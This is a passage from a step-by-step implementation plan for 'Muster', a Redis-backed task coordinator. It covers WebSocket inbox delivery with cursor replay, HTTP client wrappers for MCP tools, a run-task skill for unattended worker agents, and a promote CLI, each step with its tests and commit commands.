                await _to_review(r, ws, t.id, "spawn_failed")
            continue
        if t.worker_pane and not pane_alive(t.worker_pane):
            await _to_review(r, ws, t.id, "crashed"); continue
        if t.connected_at and _secs_between(t.connected_at, now_iso) > t.timeout:
            await _to_review(r, ws, t.id, "timeout")

async def recover(r, ws, *, pane_alive):
    for t in await store.list_by_status(r, ws, Status.WORKING):
        if not t.worker_pane:
            await store.transition(r, ws, t.id, Status.TODO, allowed_from={Status.WORKING})
        elif not pane_alive(t.worker_pane):
            reason = "crashed" if t.connected else "spawn_failed"
            await _to_review(r, ws, t.id, reason)
        # pane alive → adopt (leave WORKING)
```

Delete the first `pick` stub — keep only the `sorted(...)` version.

- [ ] **Step 4: Run, verify pass** (fix the sweep test: it calls `sweep(..., pane_alive=...)` — signature matches)

Run: `uv run --with redis --with pytest --with pytest-asyncio --no-project pytest plugins/muster/tests/test_coord_loop.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add plugins/muster/coordinator/loop.py plugins/muster/tests/test_coord_loop.py
git commit -m "feat(coordinator): claim loop, connect-grace/timeout sweeps, boot recovery"
```

---

### Task 6: WebSocket delivery + inbox stream + cursor replay

**Files:**
- Modify: `plugins/muster/coordinator/app.py` (add the WS route + a `deliver` helper)
- Test: `plugins/muster/tests/test_coord_ws.py`

**Interfaces:**
- Consumes: `keys`, a `redis.asyncio.Redis`.
- Produces:
  - `app.deliver(r, ws, name, kind, body)->str` — `XADD muster:inbox:{ws}:{name}` with `{kind,body}`, returns stream id (the durable write).
  - `WS /workspace/{ws}/agents/{name}/stream` — on connect, replay everything after `inboxread` cursor, then live-tail; advance `inboxread` per delivered id. Envelope `{id, ts, kind, body}`.

- [ ] **Step 1: Write failing test (offline message is replayed on connect)**

```python
# plugins/muster/tests/test_coord_ws.py
import pytest, redis.asyncio as aioredis
from httpx import ASGITransport
from starlette.testclient import TestClient
from plugins.muster.coordinator import app as appmod

pytestmark = pytest.mark.asyncio

async def test_deliver_writes_stream():
    r = aioredis.from_url("redis://localhost:6379/0", decode_responses=True)
    await r.flushdb()
    sid = await appmod.deliver(r, "ws", "cy", "chat", "hello")
    entries = await r.xrange("muster:inbox:ws:cy")
    assert len(entries) == 1 and entries[0][1]["body"] == "hello"
    await r.flushdb(); await r.aclose()

def test_ws_replays_offline_message():
    # sync TestClient drives the WS; message delivered before connect must arrive on connect
    import redis
    rc = redis.from_url("redis://localhost:6379/0", decode_responses=True); rc.flushdb()
    rc.xadd("muster:inbox:ws:cy", {"kind": "chat", "body": "earlier"})
    ar = aioredis.from_url("redis://localhost:6379/0", decode_responses=True)
    app = appmod.build_app(ar)
    with TestClient(app) as client:
        with client.websocket_connect("/workspace/ws/agents/cy/stream?x_api_key=k") as wsconn:
            msg = wsconn.receive_json()
            assert msg["body"] == "earlier" and msg["kind"] == "chat"
    rc.flushdb()
```

- [ ] **Step 2: Run, verify fail**

Run: `uv run --with fastapi --with 'uvicorn[standard]' --with httpx --with redis --with pytest --with pytest-asyncio --no-project pytest plugins/muster/tests/test_coord_ws.py -v`
Expected: FAIL — `deliver`/WS route missing.

- [ ] **Step 3: Add to app.py**

```python
# add near the top of app.py
from . import keys as _keys

async def deliver(r, ws: str, name: str, kind: str, body: str) -> str:
    """Durable inbox write. The WS is transport; this stream is storage."""
    return await r.xadd(_keys.inbox(ws, name), {"kind": kind, "body": body})

# add inside build_app(r), before `return app`:
    from fastapi import WebSocket, WebSocketDisconnect
    import asyncio as _aio

    @app.websocket("/workspace/{ws}/agents/{name}/stream")
    async def stream(websocket: WebSocket, ws: str, name: str):
        if not websocket.query_params.get("x_api_key"):
            await websocket.close(code=1008); return
        await websocket.accept()
        cursor = await r.get(_keys.inboxread(ws, name)) or "0"
        try:
            while True:
                res = await r.xread({_keys.inbox(ws, name): cursor}, count=64, block=1000)
                if not res:
                    continue
                for _stream, entries in res:
                    for sid, fields in entries:
                        await websocket.send_json({"id": sid, "ts": sid.split("-")[0],
                                                   "kind": fields.get("kind"), "body": fields.get("body")})
                        cursor = sid
                        await r.set(_keys.inboxread(ws, name), cursor)
        except WebSocketDisconnect:
            return
```

- [ ] **Step 4: Run, verify pass**

Run: `uv run --with fastapi --with 'uvicorn[standard]' --with httpx --with redis --with pytest --with pytest-asyncio --no-project pytest plugins/muster/tests/test_coord_ws.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add plugins/muster/coordinator/app.py plugins/muster/tests/test_coord_ws.py
git commit -m "feat(coordinator): WS delivery over durable inbox stream with cursor replay"
```

---

### Task 7: Rewire the MCP as a thin WS client

**Files:**
- Modify: `plugins/muster/mcp/busops.py` (task tool bodies call the coordinator HTTP API)
- Modify: `plugins/muster/mcp/muster_channel.py` (relay reads the coordinator WS instead of `XREAD`; add `task_*` tools)
- Test: `plugins/muster/tests/test_mcp_client.py`

**Interfaces:**
- Consumes: coordinator API base `MUSTER_COORDINATOR_URL` (default `http://localhost:8787`), `MUSTER_WORKSPACE`, `x-api-key` from `MUSTER_API_KEY`.
- Produces (in `busops.py`): `async def api_post(path, json)`, `async def api_get(path)`, and thin wrappers `task_create/task_get/task_report/task_note/task_list/task_cancel` returning parsed JSON.
- Relay change: `relay_inbox` connects `ws://…/workspace/{ws}/agents/{name}/stream?x_api_key=…`, and for each envelope calls the existing `_push_entries` path to emit `notifications/claude/channel`.

- [ ] **Step 1: Write failing test for the HTTP client wrappers (mock the transport)**

```python
# plugins/muster/tests/test_mcp_client.py
import pytest
from plugins.muster.mcp import busops

pytestmark = pytest.mark.asyncio

async def test_task_create_posts_to_workspace(monkeypatch):
    seen = {}
    async def fake_post(path, json):
        seen["path"] = path; seen["json"] = json
        return {"id": "id1", "status": "BACKLOG"}
    monkeypatch.setattr(busops, "api_post", fake_post)
    monkeypatch.setenv("MUSTER_WORKSPACE", "wsA")
    out = await busops.task_create(name="n", prompt="p", pwd="/x")
    assert out["status"] == "BACKLOG"
    assert seen["path"] == "/workspace/wsA/tasks"
    assert seen["json"]["name"] == "n"
```

- [ ] **Step 2: Run, verify fail**

Run: `uv run --with redis --with anyio --with pytest --with pytest-asyncio --with httpx --no-project pytest plugins/muster/tests/test_mcp_client.py -v`
Expected: FAIL — `busops.task_create` missing.

- [ ] **Step 3: Add the HTTP client to busops.py**

```python
# plugins/muster/mcp/busops.py  (append)
import os, httpx

def _base() -> str: return os.environ.get("MUSTER_COORDINATOR_URL", "http://localhost:8787")
def _ws() -> str: return os.environ.get("MUSTER_WORKSPACE", "local")
def _headers() -> dict: return {"x-api-key": os.environ.get("MUSTER_API_KEY", "local")}

async def api_post(path: str, json: dict) -> dict:
    async with httpx.AsyncClient(base_url=_base(), timeout=30) as c:
        resp = await c.post(path, json=json, headers=_headers())
        resp.raise_for_status(); return resp.json()

async def api_get(path: str) -> dict:
    async with httpx.AsyncClient(base_url=_base(), timeout=30) as c:
        resp = await c.get(path, headers=_headers())
        resp.raise_for_status(); return resp.json()

async def task_create(**body) -> dict:
    return await api_post(f"/workspace/{_ws()}/tasks", body)
async def task_get(id: str) -> dict:
    return await api_get(f"/workspace/{_ws()}/tasks/{id}")
async def task_report(id: str, **body) -> dict:
    return await api_post(f"/workspace/{_ws()}/tasks/{id}/report", body)
async def task_note(id: str, body: str, kind: str = "comment") -> dict:
    return await api_post(f"/workspace/{_ws()}/tasks/{id}/note", {"kind": kind, "body": body})
async def task_list(status: str | None = None) -> dict:
    return await api_get(f"/workspace/{_ws()}/tasks" + (f"?status={status}" if status else ""))
async def task_cancel(id: str) -> dict:
    return await api_post(f"/workspace/{_ws()}/tasks/{id}/cancel", {})
```

- [ ] **Step 4: Run, verify pass**

Run: `uv run --with redis --with anyio --with pytest --with pytest-asyncio --with httpx --no-project pytest plugins/muster/tests/test_mcp_client.py -v`
Expected: PASS.

- [ ] **Step 5: Wire the tools + WS relay in `muster_channel.py`**

Register the six `task_*` tools (each calls the matching `busops` wrapper and returns its JSON as text). Replace the `XREAD` body of `relay_inbox` with a WS client loop:

```python
# muster_channel.py — inside relay_inbox, replacing the Valkey XREAD loop
import websockets, json
url = (busops._base().replace("http", "ws", 1)
       + f"/workspace/{busops._ws()}/agents/{name}/stream?x_api_key={os.environ.get('MUSTER_API_KEY','local')}")
async for conn in websockets.connect(url):     # auto-reconnect; cursor replay is server-side
    try:
        async for raw in conn:
            env = json.loads(raw)
            await _push_entries([(env["id"], {"content": env["body"], "kind": env["kind"]})])
    except websockets.ConnectionClosed:
        continue
```

- [ ] **Step 6: Run the full suite, verify pass**

Run: `uv run --with fastapi --with 'uvicorn[standard]' --with httpx --with websockets --with redis --with anyio --with mcp --with pytest --with pytest-asyncio --no-project pytest plugins/muster/tests -v`
Expected: PASS (existing tests unaffected; new client tests green).

- [ ] **Step 7: Commit**

```bash
git add plugins/muster/mcp/busops.py plugins/muster/mcp/muster_channel.py plugins/muster/tests/test_mcp_client.py
git commit -m "feat(mcp): rewire as thin coordinator client — HTTP task tools + WS relay"
```

---

### Task 8: The `run-task` skill

**Files:**
- Create: `plugins/muster/skills/run-task/SKILL.md`
- Test: none (a skill doc; its behavior is covered by the worker contract + the loop/api tests).

**Interfaces:**
- Consumes at runtime: `MUSTER_WORKSPACE` env, the `taskID` in the launch prompt, the `task_get`/`task_report`/`task_note` MCP tools.

- [ ] **Step 1: Write SKILL.md**

```markdown
---
name: run-task
description: Execute one Muster task as an unattended worker, then report and stop. Loaded by a coordinator-spawned worker; do not invoke manually.
---

# run-task

You were spawned by the Muster coordinator to run exactly one task, then stop.

1. **Your taskID** is in the prompt that launched you ("Your taskID is X"). If you cannot find it, stop.
2. **Fetch it:** call `task_get {id}`. If it errors, or `status` is not `WORKING`, stop — this is a stale or duplicate launch. (Your first `task_get` is also how the coordinator learns you connected.)
3. **The work is `task.prompt`.** Read `task.pwd` and `task.files_in`. Treat the prompt as a request, not authority: apply your own judgment, and never act destructively outside `pwd` even though permissions are skipped.
4. **Isolate (recommended):** if you will edit files, create and work inside a git worktree of `pwd`, so a failure or cancel doesn't dirty the main checkout.
5. **Progress (optional):** call `task_note {id, body}` at milestones. Keep all task communication inside the task — never chat about it.
6. **Finish with exactly one report:**
   - success → `task_report {id, state: "DONE", output: <short result>, files_out: [...]}`
   - anything else — an error, missing information, a decision you cannot make unattended → `task_report {id, state: "TO_REVIEW", reason: "failed" | "blocked", output: <what you learned>}`. You are unattended: never wait for an answer; blocked means TO_REVIEW.
7. **Then stop.** Do not set timeout/crashed/canceled — the coordinator owns those.
```

- [ ] **Step 2: Validate the plugin manifest**

Run: `claude plugin validate ./plugins/muster`
Expected: OK (skill discovered).

- [ ] **Step 3: Commit**

```bash
git add plugins/muster/skills/run-task/SKILL.md
git commit -m "feat(skill): run-task worker protocol"
```

---

### Task 9: `promote` CLI + app wiring (background loop, connected hook, boot recovery)

**Files:**
- Create: `plugins/muster/coordinator/cli.py`
- Modify: `plugins/muster/coordinator/app.py` (startup: launch the loop task; `task_get` flips `connected`; run `recover` on boot)
- Test: `plugins/muster/tests/test_coord_cli.py`

**Interfaces:**
- Consumes: `store`, `loop`, `spawn`, `config`.
- Produces:
  - `cli.promote(ws, id)` — `BACKLOG→TODO` (async; run via `python -m plugins.muster.coordinator.cli promote ws id`).
  - `app` startup: an `asyncio` task running `claim_once` + `sweep` every second; `GET /tasks/{id}` calls `store.set_connected` when the caller is the assigned worker (P1: any `task_get` on a `WORKING`+`!connected` task flips it).

- [ ] **Step 1: Write failing test for promote + connected**

```python
# plugins/muster/tests/test_coord_cli.py
import pytest, redis.asyncio as aioredis
from plugins.muster.coordinator import store, cli
from plugins.muster.coordinator.models import Status, TaskCreate

pytestmark = pytest.mark.asyncio

@pytest.fixture
async def r():
    c = aioredis.from_url("redis://localhost:6379/0", decode_responses=True)
    await c.flushdb(); yield c; await c.flushdb(); await c.aclose()

async def test_promote_moves_backlog_to_todo(r):
    t = await store.create(r, "ws", TaskCreate(name="n", prompt="p", pwd="/x"),
                           created_by="bot", enqueued_by="cy", model="m", host="h")
    await cli.promote(r, "ws", t.id)
    assert (await store.get(r, "ws", t.id)).status == Status.TODO

async def test_connected_flip(r):
    t = await store.create(r, "ws", TaskCreate(name="n", prompt="p", pwd="/x"),
                           created_by="bot", enqueued_by="cy", model="m", host="h")
    await store.transition(r, "ws", t.id, Status.TODO, allowed_from={Status.BACKLOG})
    await store.transition(r, "ws", t.id, Status.WORKING, allowed_from={Status.TODO})
    got = await store.set_connected(r, "ws", t.id, "cy-pid:9", "2026-01-01T00:00:00+00:00")
    assert got.connected and got.assigned_to == "cy-pid:9"
```

- [ ] **Step 2: Run, verify fail**

Run: `uv run --with redis --with pytest --with pytest-asyncio --no-project pytest plugins/muster/tests/test_coord_cli.py -v`
Expected: FAIL — cli missing.

- [ ] **Step 3: Implement cli.py**

```python
# plugins/muster/coordinator/cli.py
import asyncio, sys
import redis.asyncio as aioredis
from . import store
from .config import settings
from .models import Status

async def promote(r, ws: str, id: str):
    """BACKLOG -> TODO. Coordinator-host only; deliberately not an HTTP endpoint."""
    await store.transition(r, ws, id, Status.TODO, allowed_from={Status.BACKLOG})

async def _main(argv):
    r = aioredis.from_url(settings.valkey_url, decode_responses=True)
    if argv[:1] == ["promote"]:
        await promote(r, argv[1], argv[2]); print("promoted")
    await r.aclose()

if __name__ == "__main__":
    asyncio.run(_main(sys.argv[1:]))
```

- [ ] **Step 4: Run, verify pass**

Run: `uv run --with redis --with pytest --with pytest-asyncio --no-project pytest plugins/muster/tests/test_coord_cli.py -v`
Expected: PASS.

- [ ] **Step 5: Wire the loop + connected + recovery into app.py**

Add to `build_app(r)`: a `@app.on_event("startup")` that runs `loop.recover(...)` once, then launches a background task looping `loop.claim_once(...)` + `loop.sweep(...)` every second (guard each iteration with try/except so one bad task can't kill the loop). In `GET /tasks/{id}`, after loading the task, if `status==WORKING and not connected`, call `store.set_connected(r, ws, id, x_api_key, store._now())`. Use `herdr pane list` for the `pane_alive` predicate (a helper in `spawn.py`: `pane_alive(pane_id)->bool`).

```python
# spawn.py (append)
def pane_alive(pane_id: str) -> bool:
    try:
        out = _herdr("pane", "list")
        import json as _j
        return any(p["pane_id"] == pane_id for p in _j.loads(out)["result"]["panes"])
    except Exception:
        return False
```

```python
# app.py — inside build_app, before return
    import asyncio as _aio, socket as _sock
    from . import loop, spawn
    def _spawner(t):
        return spawn.spawn(t.pwd, t.workspace, t.model, t.id,
                           workspace_id=os.environ.get("HERDR_WORKSPACE_ID", ""))
    @app.on_event("startup")
    async def _startup():
        for ws_name in await r.keys("muster:tasks:*"):
            wsid = ws_name.split(":")[-1]
            await loop.recover(r, wsid, pane_alive=spawn.pane_alive)
        async def _run():
            while True:
                try:
                    for ws_name in await r.keys("muster:tasks:*"):
                        wsid = ws_name.split(":")[-1]
                        await loop.claim_once(r, wsid, spawner=_spawner,
                                              host=_sock.gethostname(),
                                              workspace_id=os.environ.get("HERDR_WORKSPACE_ID", ""))
                        await loop.sweep(r, wsid, now_iso=store._now(), pane_alive=spawn.pane_alive)
                except Exception:
                    pass
                await _aio.sleep(1)
        _aio.create_task(_run())
```

(Add `import os` at the top of app.py; update `GET /tasks/{id}` to flip `connected` as described.)

- [ ] **Step 6: Run the whole suite, verify pass**

Run: `docker compose up -d && uv run --with fastapi --with 'uvicorn[standard]' --with httpx --with websockets --with redis --with anyio --with mcp --with pytest --with pytest-asyncio --no-project pytest plugins/muster/tests -v`
Expected: PASS.

- [ ] **Step 7: Manual end-to-end smoke (documented, run once)**

```bash
# terminal 1: coordinator
MUSTER_WORKSPACE_FOLDER=$PWD HERDR_WORKSPACE_ID=$HERDR_WORKSPACE_ID \
  uv run --with fastapi --with 'uvicorn[standard]' --with redis --no-project \
  uvicorn plugins.muster.coordinator.app:build_app --factory --port 8787
# terminal 2: create + promote + watch
curl -s -XPOST localhost:8787/workspace/local/tasks -H x-api-key:local \
  -H content-type:application/json \
  -d "{\"name\":\"echo\",\"prompt\":\"print hello to output\",\"pwd\":\"$PWD\"}"
python -m plugins.muster.coordinator.cli promote local <id>
# expect: a herdr pane spawns, worker runs run-task, task reaches DONE, pane closes
```

- [ ] **Step 8: Commit**

```bash
git add plugins/muster/coordinator/cli.py plugins/muster/coordinator/app.py plugins/muster/coordinator/spawn.py plugins/muster/tests/test_coord_cli.py
git commit -m "feat(coordinator): promote CLI, background loop, connected hook, boot recovery"
```

---

## Self-Review notes (addressed)

- **Spec coverage:** create/BACKLOG (T3), promote→TODO (T9), claim→WORKING (T5), spawn contract (T4), connected/two-phase liveness (T5/T9), DONE/TO_REVIEW + review_reason Tag (T3), cancel hard-kill (T3), WS stream + cursor replay (T6), MCP-as-client (T7), run-task skill (T8), boot recovery (T5/T9), pwd/model validation (T1/T4), single-lock transitions (T2). No retry/DEAD_LETTER (out of scope, per spec).
- **Deferred to P2 (not in this plan, matches spec §10):** files store endpoints + >64KB output spill, per-task tokens, federation, UI, retry.
- **Type consistency:** `store.transition(..., allowed_from=set, **fields)`, `loop.claim_once(r, ws, *, spawner, host, workspace_id)`, `spawn.build_cmd(pwd, ws, model, task_id)`, `store.set_connected(r, ws, id, worker_name, at)` — used identically across tasks.
```
